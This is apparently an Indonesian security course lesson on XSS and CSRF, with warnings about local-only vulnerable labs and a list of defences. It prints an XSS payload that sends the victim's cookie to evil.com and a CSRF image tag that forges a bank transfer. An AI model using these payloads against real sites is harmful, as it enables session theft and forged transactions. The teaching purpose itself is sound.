# 06 — XSS dan CSRF

> ⚠️ **Peringatan lab rentan:** `01-xss-lab.html`, `02-xss-fix.js` (sebelum diperbaiki), dan
> `03-csrf-server.js` + `attacker-page.html` SENGAJA rentan. Jalankan hanya di laptopmu (server
> terkunci ke `127.0.0.1`), jangan di-upload/deploy, dan jangan pakai payload ke website orang lain.
> Setiap kerentanan yang kamu coba wajib kamu perbaiki di tugas berikutnya.

## XSS (Cross-Site Scripting)

### Apa itu XSS?

Penyerang menyisipkan kode JavaScript jahat yang dijalankan di browser korban.

### Contoh
```html
<!-- User input: -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- Kalau tidak di-sanitize, script ini jalan di browser korban -->
```

### Jenis XSS

1. **Stored XSS** — Script disimpan di database (komentar, profil)
2. **Reflected XSS** — Script dari URL ditampilkan langsung
3. **DOM XSS** — Script manipulasi DOM di client

### Pencegahan

```javascript
// ❌ RENTAN
element.innerHTML = userInput;

// ✅ AMAN
element.textContent = userInput;

// ✅ Atau gunakan library sanitizer
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

---

## CSRF (Cross-Site Request Forgery)

### Apa itu CSRF?

Penyerang membuat korban mengirim request tanpa sadar ke website yang sudah di-login.

### Contoh Skenario

1. User login ke bank.com
2. User buka halaman jahat yang berisi:
   ```html
   <img src="https://bank.com/transfer?to=attacker&amount=1000000">
   ```
3. Browser otomatis kirim request dengan cookie bank.com!

### Pencegahan

1. **CSRF Token** — Token random yang harus disertakan di setiap form
2. **SameSite Cookie** — Cookie tidak dikirim dari domain lain
3. **Cek Origin/Referer header** — Validasi asal request

Cara kerja token CSRF, tanpa kode supaya kamu menuliskannya sendiri di lab:

1. Saat membuat halaman form, server membuat string acak yang sulit ditebak dan menyimpannya di sesi pengguna.
2. String itu ikut dikirim di form sebagai field tersembunyi.
3. Saat form dikirim, server membandingkan kiriman dengan yang ada di sesi. Kalau kosong atau beda, request ditolak.

Pertanyaan pemandu:
- Fungsi bawaan Node apa yang cocok untuk membuat string acak yang aman (cari modul `crypto`)?
- Kenapa halaman penyerang tidak bisa mendapatkan token itu, padahal browser korban ikut mengirim cookie?
- Status HTTP apa yang tepat untuk request yang ditolak?

---

## Best Practices

1. **Escape semua output** — Anggap semua data user berbahaya
2. **Content-Security-Policy header** — Batasi script yang boleh jalan
3. **HttpOnly cookie** — Cegah JavaScript akses cookie session
4. **SameSite=Strict cookie** — Cegah CSRF
5. **Validasi input di server** — Frontend sanitization bisa di-bypass
